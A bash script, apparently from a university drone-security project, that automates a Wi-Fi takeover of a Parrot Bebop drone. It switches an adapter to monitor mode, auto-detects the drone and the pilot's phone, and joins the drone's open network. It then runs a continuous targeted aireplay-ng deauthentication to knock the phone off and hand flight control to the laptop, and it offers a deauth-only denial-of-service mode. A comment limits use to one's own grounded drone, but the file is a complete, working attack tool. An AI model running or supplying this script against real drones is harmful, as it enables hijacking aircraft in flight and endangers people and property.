#!/bin/bash
# wifi_attack.sh - deauth the phone off YOUR OWN Bebop and take over control
# from the laptop with raw_video_fly.py.
#
#   1. auto-detect the drone (BSSID + channel) and the phone's MAC
#   2. join the drone's Wi-Fi on the built-in adapter (internet drops)
#   3. targeted deauth of the phone -> frees the drone's single controller slot
#   4. launch raw_video_fly.py; the moment it connects, STOP the deauth
#
# This TRANSMITS and hijacks control. Use only on your own drone, grounded.

IFACE="wlx00c0cabe245c"                 # Alfa MT7612U — monitor mode + deauth
NET_IFACE="wlp3s0"                      # built-in Wi-Fi — joins the drone net
DRONE_IP="192.168.42.1"
BSSID="${BSSID:-}"                      # auto-detected; or export BSSID=AA:BB:..
SSID_PREFIX="${SSID_PREFIX:-BebopDrone}"
RUN_FLY="${RUN_FLY:-1}"                 # 1 = take over w/ raw_video_fly; 0 = DoS only

BASE="/home/sakar/UNR_Projects/BebopDrone"
VENV="$BASE/.venv37/bin/python3"
FINDER="$BASE/find_phone.py"
DRONEFINDER="$BASE/find_drone.py"
FLY="$BASE/raw_video_fly.py"

PREV_CON=""          # NM connection to restore on exit (internet)
JOINED=0             # did we switch NET_IFACE onto the drone?
CLEANED=0            # guard so cleanup runs once (SIGINT + EXIT both fire)

stop_deauth() { sudo pkill -f "aireplay-ng.*--deauth" 2>/dev/null; }

cleanup() {
    [ "$CLEANED" = "1" ] && return 0
    CLEANED=1
    echo -e "\n[+] Stopping — cleaning up..."
    stop_deauth
    kill $(jobs -p) 2>/dev/null
    # restore the Alfa to managed
    sudo ip link set "$IFACE" down 2>/dev/null
    sudo iw dev "$IFACE" set type managed 2>/dev/null
    sudo ip link set "$IFACE" up 2>/dev/null
    # restore internet on the built-in adapter
    if [ "$JOINED" = "1" ]; then
        if [ -n "$PREV_CON" ]; then
            echo "[+] Restoring internet ($PREV_CON on $NET_IFACE)..."
            sudo nmcli connection up "$PREV_CON" ifname "$NET_IFACE" 2>/dev/null
        else
            sudo nmcli device disconnect "$NET_IFACE" 2>/dev/null
        fi
    fi
    exit 0
}
trap cleanup SIGINT EXIT

# Launch raw_video_fly.py as the real user (pygame needs the user's display),
# whether or not this script itself is running under sudo.
run_fly() {
    local U="${SUDO_USER:-$USER}"
    local UID_; UID_="$(id -u "$U")"
    local DISP="${DISPLAY:-:0}"
    local XAUTH; XAUTH="$(ls /run/user/$UID_/.mutter-Xwaylandauth.* 2>/dev/null | head -1)"
    [ -z "$XAUTH" ] && XAUTH="/home/$U/.Xauthority"
    if [ "$(id -u)" = "0" ] && [ -n "$SUDO_USER" ]; then
        sudo -u "$U" env DISPLAY="$DISP" XAUTHORITY="$XAUTH" "$VENV" "$FLY"
    else
        DISPLAY="$DISP" XAUTHORITY="$XAUTH" "$VENV" "$FLY"
    fi
}

# 1. Alfa -> monitor mode
echo "[+] Setting $IFACE to monitor mode..."
sudo ip link set "$IFACE" down
sudo iw dev "$IFACE" set type monitor
sudo ip link set "$IFACE" up

# 2. Auto-detect the drone's BSSID + channel (SSID prefix or Parrot OUI)
channel_num="${CHANNEL:-}"
if [ -z "$BSSID" ] || [ -z "$channel_num" ]; then
    echo "[+] Auto-detecting the drone (SSID '$SSID_PREFIX*')..."
    read -r DET_BSSID DET_CH < <(sudo "$VENV" "$DRONEFINDER" "$IFACE" "$SSID_PREFIX")
    [ -z "$BSSID" ] && BSSID="$DET_BSSID"
    [ -z "$channel_num" ] && channel_num="$DET_CH"
fi
if [ -z "$BSSID" ] || [ -z "$channel_num" ]; then
    echo "[!] Auto-detect failed. Manual scan — find your target, then Ctrl-C."
    sudo airodump-ng "$IFACE"
    echo ""
    [ -z "$BSSID" ] && read -p "Enter drone BSSID (MAC): " BSSID
    [ -z "$channel_num" ] && read -p "Enter the target channel number: " channel_num
fi
sudo iw dev "$IFACE" set channel "$channel_num"
echo "[+] Drone $BSSID — locked to channel $channel_num."

# 3. Auto-detect the phone's MAC. Targeted deauth is mandatory here: a broadcast
#    deauth would also knock our own laptop off the drone, so abort if unknown.
echo "[+] Detecting the phone's MAC..."
PHONE_MAC="$(sudo "$VENV" "$FINDER" "$IFACE" "$BSSID")"
if [ -z "$PHONE_MAC" ]; then
    echo "[!] Phone MAC not found — aborting takeover (won't broadcast-deauth,"
    echo "    that would drop our own laptop too). Make sure the phone is"
    echo "    streaming video, then retry."
    exit 1
fi
echo "[+] Phone: $PHONE_MAC"

if [ "$RUN_FLY" != "1" ]; then
    # DoS-only mode: just hold the phone off until Ctrl-C.
    echo "[+] DoS-only mode (RUN_FLY=0). Deauthing $PHONE_MAC; Ctrl-C to stop."
    sudo aireplay-ng --deauth 0 -a "$BSSID" -c "$PHONE_MAC" "$IFACE"
    exit 0
fi

# 4. Join the drone's Wi-Fi on the built-in adapter (internet drops here).
#    Connect by SSID (NM indexes its scan by SSID, not BSSID). It can take a
#    couple of rescans before the open BebopDrone AP shows up in the list.
echo "[+] Joining the drone network on $NET_IFACE (internet will drop)..."
PREV_CON="$(nmcli -t -f NAME,DEVICE connection show --active \
            | awk -F: -v d="$NET_IFACE" '$2==d{print $1; exit}')"

DRONE_SSID=""
for _ in $(seq 1 8); do
    DRONE_SSID="$(nmcli -t -f SSID device wifi list ifname "$NET_IFACE" 2>/dev/null \
                  | grep -i "^${SSID_PREFIX}" | head -1)"
    [ -n "$DRONE_SSID" ] && break
    sudo nmcli device wifi rescan ifname "$NET_IFACE" 2>/dev/null
    sleep 2
done

if [ -n "$DRONE_SSID" ]; then
    echo "[+] Connecting to SSID '$DRONE_SSID'..."
    sudo nmcli device wifi connect "$DRONE_SSID" ifname "$NET_IFACE"
else
    echo "[+] SSID not in scan yet; trying BSSID $BSSID directly..."
    sudo nmcli device wifi connect "$BSSID" ifname "$NET_IFACE"
fi
JOINED=1

echo "[+] Waiting for the drone to be reachable..."
for _ in $(seq 1 20); do
    ping -c1 -W1 "$DRONE_IP" >/dev/null 2>&1 && break
    sleep 1
done
if ! ping -c1 -W1 "$DRONE_IP" >/dev/null 2>&1; then
    echo "[!] Drone still unreachable on $NET_IFACE — check the connection."
    exit 1
fi
echo "[+] Drone reachable."

# 5. Start the targeted deauth (frees the controller slot), then take over.
echo "[+] Deauthing the phone (TRANSMITTING, drone grounded!)..."
sudo aireplay-ng --deauth 0 -a "$BSSID" -c "$PHONE_MAC" "$IFACE" >/dev/null 2>&1 &
sleep 5    # give the phone time to drop and release the single controller slot

echo "[+] Launching raw_video_fly.py; deauth stops the instant it connects."
run_fly 2>&1 | while IFS= read -r line; do
    echo "$line"
    case "$line" in
        *"connected, c2d_port"*)
            echo "[+] Laptop is now the controller -> stopping deauth."
            stop_deauth ;;
    esac
done

# raw_video_fly exited -> cleanup (trap) restores the adapters + internet.
